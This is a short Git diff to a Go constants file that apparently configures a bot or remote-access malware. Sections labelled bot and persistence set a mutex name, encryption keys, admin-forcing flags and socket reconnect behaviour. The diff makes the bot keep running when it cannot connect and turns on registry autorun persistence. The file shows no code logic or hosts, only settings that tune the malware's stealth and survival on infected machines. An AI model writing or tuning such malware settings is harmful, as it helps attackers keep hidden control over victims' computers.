@@ -1,11 +1,13 @@
 package store
 
+// misc
 const (
 	LAUNCH_KEY string = ""
 
 	MUTEX_NAME string = ""
 
-	CRYPTO_KEY string = ""
+	CRYPTO_KEY_1 string = ""
+	CRYPTO_KEY_2 string = ""
 )
 
 // bot
@@ -42,9 +44,9 @@ const (
 	FORCE_ADMIN            bool = false
 	CONTINUE_WITHOUT_ADMIN bool = false
 
-	OPEN_BOT_SOCKET_MAX_RETRIES int  = 50
-	OPEN_BOT_SOCKET_DELAY       int  = 100
-	EXIT_IF_CANT_CONNECT        bool = true
+	OPEN_BOT_SOCKET_MAX_RETRIES int  = 20
+	OPEN_BOT_SOCKET_DELAY       int  = 15
+	EXIT_IF_CANT_CONNECT        bool = false
 )
 
 // persistence
@@ -52,5 +54,5 @@ const (
 	PERSISTENCE_NAME string = ""
 
 	TASK_SCHEDULAR bool = false
-	AUTO_RUN_REG   bool = false
+	AUTO_RUN_REG   bool = true
 )
